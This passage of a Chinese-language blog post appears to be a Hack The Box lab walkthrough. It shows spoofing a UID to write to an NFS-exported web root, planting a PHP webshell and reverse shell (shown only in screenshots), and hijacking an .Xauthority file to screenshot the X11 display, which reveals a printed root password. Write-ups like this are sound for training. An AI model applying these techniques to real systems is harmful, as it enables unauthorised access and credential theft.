+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687363023286-71f4eafe-7770-448c-942b-b544e08c7fb2.png#averageHue=%23191919&clientId=u0ccc4ae2-e6a7-4&from=paste&height=166&id=ufc4c8e04&originHeight=207&originWidth=732&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=21787&status=done&style=none&taskId=uc76c1872-0d7f-4efd-bc78-6a2ee7e617c&title=&width=585.6" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>我们在&#x2F;home&#x2F;ross根目录下发现了这个文件，后续会进行利用</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687363302574-0847ec2c-cac6-4f07-a997-03507cb8c019.png#averageHue=%23171717&clientId=u0ccc4ae2-e6a7-4&from=paste&height=296&id=uc8013153&originHeight=370&originWidth=666&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=36778&status=done&style=none&taskId=u2b0144ac-8173-4317-97f3-afec0bb492b&title=&width=532.8" alt="image.png"><br>没有更改uid的时候都是显示权限不足</p>
+<h2 id="x2F-var-x2F-www-x2F-html"><a href="#x2F-var-x2F-www-x2F-html" class="headerlink" title="&#x2F;var&#x2F;www&#x2F;html"></a>&#x2F;var&#x2F;www&#x2F;html</h2><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687363104623-66f98fd8-d2ca-44fb-b9a3-84993edd5fc3.png#averageHue=%23191818&clientId=u0ccc4ae2-e6a7-4&from=paste&height=146&id=u9e8afe29&originHeight=183&originWidth=690&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=23218&status=done&style=none&taskId=u7b6ee7d0-94e5-4253-84f8-0f174692594&title=&width=552" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>这里可以看到挂载后的html是属于uid&#x3D;2017用户的</p>
+<pre><code class="bash">┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/Squashed]
+└─# usermod someb0dy --help
+Usage: usermod [options] LOGIN
+
+Options:
+  -a, --append                  append the user to the supplemental GROUPS
+                                mentioned by the -G option without removing
+                                the user from other groups
+  -b, --badname                 allow bad names
+  -c, --comment COMMENT         new value of the GECOS field
+  -d, --home HOME_DIR           new home directory for the user account
+  -e, --expiredate EXPIRE_DATE  set account expiration date to EXPIRE_DATE
+  -f, --inactive INACTIVE       set password inactive after expiration
+                                to INACTIVE
+  -g, --gid GROUP               force use GROUP as new primary group
+  -G, --groups GROUPS           new list of supplementary GROUPS
+  -h, --help                    display this help message and exit
+  -l, --login NEW_LOGIN         new value of the login name
+  -L, --lock                    lock the user account
+  -m, --move-home               move contents of the home directory to the
+                                new location (use only with -d)
+  -o, --non-unique              allow using duplicate (non-unique) UID
+  -p, --password PASSWORD       use encrypted password for the new password
+  -P, --prefix PREFIX_DIR       prefix directory where are located the /etc/* files
+  -r, --remove                  remove the user from only the supplemental GROUPS
+                                mentioned by the -G option without removing
+                                the user from other groups
+  -R, --root CHROOT_DIR         directory to chroot into
+  -s, --shell SHELL             new login shell for the user account
+  -u, --uid UID                 new UID for the user account
+  -U, --unlock                  unlock the user account
+  -v, --add-subuids FIRST-LAST  add range of subordinate uids
+  -V, --del-subuids FIRST-LAST  remove range of subordinate uids
+  -w, --add-subgids FIRST-LAST  add range of subordinate gids
+  -W, --del-subgids FIRST-LAST  remove range of subordinate gids
+  -Z, --selinux-user SEUSER     new SELinux user mapping for the user account
+
+
+┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/Squashed]
+└─# usermod someb0dy -u 2017
+
+┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/Squashed]
+└─# su someb0dy
+kali% idd
+zsh: command not found: idd
+kali% id
+uid=2017(someb0dy) gid=1001(someb0dy) groups=1001(someb0dy)
+kali%
+</code></pre>
+<p>进去之后我们对web根目录有着完全的权限，就可以写文件了，查看.htaccess发现支持 php的解析，上一个一句话木马</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687363472962-769ee494-f66a-404c-bd3f-7b344a300697.png#averageHue=%23181818&clientId=u0ccc4ae2-e6a7-4&from=paste&height=431&id=u27339839&originHeight=539&originWidth=680&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=60600&status=done&style=none&taskId=uf6cc5ba9-597d-4aec-8bf4-5bfa7155777&title=&width=544" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>可以命令执行之后尝试反弹shell</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687363945028-f4db6776-2909-417b-b569-c177ebd714e9.png#averageHue=%23161616&clientId=u0ccc4ae2-e6a7-4&from=paste&height=524&id=u758d7081&originHeight=655&originWidth=1479&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=157193&status=done&style=none&taskId=u1ff80117-137c-445e-8052-a14d928928e&title=&width=1183.2" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687404025477-3553b028-0584-4b78-943a-aa5c05c17faa.png#averageHue=%232e2d2d&clientId=u0ccc4ae2-e6a7-4&from=paste&height=427&id=ue6186a66&originHeight=534&originWidth=1245&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=94883&status=done&style=none&taskId=u5bd38796-52e6-487b-8a0a-93b935d5506&title=&width=996" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687363953396-bc11c3b1-255b-4fb9-88ed-d5499cc547fc.png#averageHue=%23101010&clientId=u0ccc4ae2-e6a7-4&from=paste&height=338&id=ubd265945&originHeight=423&originWidth=1027&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=33042&status=done&style=none&taskId=uea9480b3-f7e0-4c9b-b6ec-e55495384df&title=&width=821.6" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>	
+<p>成功拿到user权限</p>
+<h1 id="root"><a href="#root" class="headerlink" title="root"></a>root</h1><p>Refer:<a href="https://book.hacktricks.xyz/network-services-pentesting/6000-pentesting-x11#screenshots-capturing" target="_blank" rel="noopener">https://book.hacktricks.xyz/network-services-pentesting/6000-pentesting-x11#screenshots-capturing</a></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687404341141-8b60a1be-f0fc-4efb-803a-a03382d397fd.png#averageHue=%231e242a&clientId=u0ccc4ae2-e6a7-4&from=paste&height=200&id=u4f6846fd&originHeight=250&originWidth=1080&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=48499&status=done&style=none&taskId=u66591a0c-0a03-4702-872c-2453ad6cab8&title=&width=864" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+
+<h2 id="上传-Xauthority文件"><a href="#上传-Xauthority文件" class="headerlink" title="上传.Xauthority文件"></a>上传.Xauthority文件</h2><p>我们通过挂载的方式可以拿到.Xauthority 这个文件</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687400305821-9def45bd-804b-41c0-a84c-2858868a09b2.png#averageHue=%23131313&clientId=u0ccc4ae2-e6a7-4&from=paste&height=634&id=uda6d4ab2&originHeight=792&originWidth=1918&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=167225&status=done&style=none&taskId=ua4ce1c19-ca95-425e-ad8b-7aae5bc5b75&title=&width=1534.4" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>将.Xauthority文件上传到&#x2F;目标机器home&#x2F;alex目录下</p>
+<h2 id="授权验证尝试"><a href="#授权验证尝试" class="headerlink" title="授权验证尝试"></a>授权验证尝试</h2><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687400713149-29900d5d-570e-4522-b5d6-d8eecbd0cea3.png#averageHue=%231f242a&clientId=u0ccc4ae2-e6a7-4&from=paste&height=295&id=u06c3e4e5&originHeight=369&originWidth=1098&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=29276&status=done&style=none&taskId=u848062ed-95af-423d-9d72-f7b02862f29&title=&width=878.4" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687400484593-91a9b348-f1cb-47be-9fd7-b542c87fbbc2.png#averageHue=%23151313&clientId=u0ccc4ae2-e6a7-4&from=paste&height=677&id=u20b09bbc&originHeight=846&originWidth=1615&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=113439&status=done&style=none&taskId=ud084f1e5-cfbc-4a33-b2e3-436fb8a1752&title=&width=1292" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>我们把授权文件发送到&#x2F;home&#x2F;alex根目录下的时候<br>直接执行 xdpyinfo -display :0 进行授权验证，并且查询相关信息的时候失败了<br>我们看到HOME这个环境变量是空的<br>解决方法是 export HOME&#x3D;&#x2F;home&#x2F;alex ，即把HOME这个环境变量添加上</p>
+<h2 id="获取屏幕截图"><a href="#获取屏幕截图" class="headerlink" title="获取屏幕截图"></a>获取屏幕截图</h2><p>Refer:<a href="https://book.hacktricks.xyz/network-services-pentesting/6000-pentesting-x11#screenshots-capturing" target="_blank" rel="noopener">https://book.hacktricks.xyz/network-services-pentesting/6000-pentesting-x11#screenshots-capturing</a></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687403393785-948f6f29-29b3-47ea-94ac-6887e3cf234d.png#averageHue=%231e2328&clientId=u0ccc4ae2-e6a7-4&from=paste&height=175&id=u13f7bebd&originHeight=219&originWidth=1068&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=16833&status=done&style=none&taskId=ud71319fb-06a8-449e-b981-9d6e66afb93&title=&width=854.4" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<h2 id="下载文件—-screenshoot-xwd"><a href="#下载文件—-screenshoot-xwd" class="headerlink" title="下载文件—-screenshoot.xwd"></a>下载文件—-screenshoot.xwd</h2><h3 id="通过web目录"><a href="#通过web目录" class="headerlink" title="通过web目录"></a>通过web目录</h3><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687402827427-5fea3b8c-14fb-4681-85ec-6fbc29e20be8.png#averageHue=%23141414&clientId=u0ccc4ae2-e6a7-4&from=paste&height=380&id=iJFNU&originHeight=475&originWidth=1339&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=52187&status=done&style=none&taskId=ue8523131-2fdd-4f98-aa54-002f364ec8b&title=&width=1071.2" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>我们直接在<br>我们如何下载到这个文件呢！？<br>bingo！！！ 把这个文件移动到web根目录</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687402950218-87f3ff4b-25ea-4268-a0ce-ac43176c713a.png#averageHue=%23121212&clientId=u0ccc4ae2-e6a7-4&from=paste&height=559&id=LnEQC&originHeight=699&originWidth=1521&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=75598&status=done&style=none&taskId=uf1c3de42-7af4-4f49-b530-d8fe5e6ab95&title=&width=1216.8" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687402981270-5dab7cd1-6d9e-45f8-ac1d-2ef8d0c72e2c.png#averageHue=%23243247&clientId=u0ccc4ae2-e6a7-4&from=paste&height=690&id=Atg4O&originHeight=862&originWidth=1658&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=980003&status=done&style=none&taskId=ue58f0d57-73c0-46fd-955c-0946c796893&title=&width=1326.4" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<h3 id="通过nc-的命令"><a href="#通过nc-的命令" class="headerlink" title="通过nc 的命令"></a>通过nc 的命令</h3><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687403581080-b19ec9ec-64e9-48d6-a28d-398a180454e3.png#averageHue=%23151515&clientId=u0ccc4ae2-e6a7-4&from=paste&height=162&id=u2277e337&originHeight=203&originWidth=1918&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=37382&status=done&style=none&taskId=u5ce330f7-3e21-43e4-94ed-bce20f80976&title=&width=1534.4" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>这样也可以将文件发送到我们自己的kaili机器上</p>
+<p>接着使用**covert screen.xwd screen.png **转换成图片</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687403182371-cd7b2e5c-be23-4019-8861-1b9776efc021.png#averageHue=%2378afa3&clientId=u0ccc4ae2-e6a7-4&from=paste&height=631&id=ucd8eaf2e&originHeight=789&originWidth=1668&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=470385&status=done&style=none&taskId=u48ca5d9d-0f67-4727-8163-6d27b39ce40&title=&width=1334.4" alt="image.png"><br>截图的内容！有root的密码</p>
+<table>
+<thead>
+<tr>
+<th>username</th>
+<th>password</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>root</td>
+<td>cah$mei7rai9A</td>
+</tr>
+</tbody></table>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1687403282136-5804db3a-2ab1-4264-8048-1003370de540.png#averageHue=%23131313&clientId=u0ccc4ae2-e6a7-4&from=paste&height=361&id=uf9e2aaf2&originHeight=451&originWidth=810&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=35459&status=done&style=none&taskId=uf41297a8-224f-4a9f-b65c-575f4bba0c7&title=&width=648" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+
+
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这台靶机又让我学习到一个新的攻击的点，2049  端口 NFS 协议，允许我们挂载文件到本地(但是要注意鉴权,UID&#x2F;GID)，接着进一步利用，在提权部分，对.Xauthority文件的利用也是挺有意思的，通过获取屏幕截图看到管理员将密码展示在桌面上</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2023-06-25T16:13:26.942Z" itemprop="dateUpdated">2023-06-26 00:13:26</time>
+</span><br>
+
+
+        
+        IF the blog help you a lot ,Buy me a cup of coffee~：<a href="/2023/06/26/Squashed/" target="_blank" rel="external">someb0dy.github.io/2023/06/26/Squashed/</a>
+        
+    </div>
+    
+    <footer>
+        <a href="someb0dy.github.io">
+            <img src="/img/avatar.jpg" alt="Someb0dy">
+            Someb0dy
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" target="_blank" rel="noopener" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/NFS-Xauthority/" rel="tag">NFS,.Xauthority</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=someb0dy.github.io/2023/06/26/Squashed/&title=《Squashed》 — Someb0dy's blog&pic=someb0dy.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" target="_blank" rel="noopener" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=someb0dy.github.io/2023/06/26/Squashed/&title=《Squashed》 — Someb0dy's blog&source=Always Be Hungry,Be Foolish" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=someb0dy.github.io/2023/06/26/Squashed/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Squashed》 — Someb0dy's blog&url=someb0dy.github.io/2023/06/26/Squashed/&via=someb0dy.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=someb0dy.github.io/2023/06/26/Squashed/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" target="_blank" rel="noopener" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2023/06/26/Format/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">Format</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</article>
+
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;" target="_blank" rel="noopener"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        IF My blog Help you A lot Please Buy me a coffee~
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/wechat.png" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/wechat.png" data-alipay="/img/ali.png">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>Someb0dy &copy; 2015 - 2023</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" target="_blank" rel="noopener" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=someb0dy.github.io/2023/06/26/Squashed/&title=《Squashed》 — Someb0dy's blog&pic=someb0dy.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" target="_blank" rel="noopener" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=someb0dy.github.io/2023/06/26/Squashed/&title=《Squashed》 — Someb0dy's blog&source=Always Be Hungry,Be Foolish" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=someb0dy.github.io/2023/06/26/Squashed/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Squashed》 — Someb0dy's blog&url=someb0dy.github.io/2023/06/26/Squashed/&via=someb0dy.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=someb0dy.github.io/2023/06/26/Squashed/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;" target="_blank" rel="noopener"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAK4AAACuCAAAAACKZ2kyAAABx0lEQVR42u3aQU7EMAwF0Ln/pYvECmlo+babTJFeVqPC0BcWVvLt1ytex/dKnvxc78/Pnty8cHFxx9zjcr3jrj8nq/pdXFzcT3Gvi1depKpbyg24uLjP5FYPQNVt4OLi/kduFd2j4+LiPoebXFSqBSvfwJK7Gi4u7oBbDUxXfF6Y7+Li4ha5R3FVo43kWFN4Oy4u7hZu/pqkDOWNk+RydVrmcHFxF3OTmKOHaP7nevkNLi7uFm61tPUClHIBxcXF3cLNDy6TJ3kYGkWluLi4i7nJ+FS1ITq/8Jz+BVxc3I3cBJcfRyatGlxc3Kdxk6/lBa43PPHH7+Pi4n6I22uNTMKOcnsVFxd3MbfXoei1V/O3lHvCuLi4t3KTi01ehvJDT/XS9cscGS4u7jJutdWRFLg8Tm02XXBxcRdz54UsP+j0hjZuPuLg4uLG3DzamEerowgVFxd3I7cXXPbGLKLrzdn2cHFxt3An7c+8YFU3fMOoBy4u7phbjTLnjZbehnFxcfdzkxQiCTdHo1dJcIOLi/swbu+nvbh2NJiFi4u7ndsbz6o2VHBxcZ/ATS4/+VhG73N09cLFxd3CrQam1RZLLzDFxcX9EPcL0G6VjJT/LnoAAAAASUVORK5CYII=" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '不想看就别看了！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '你还敢回来！';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+</body>
+</html>
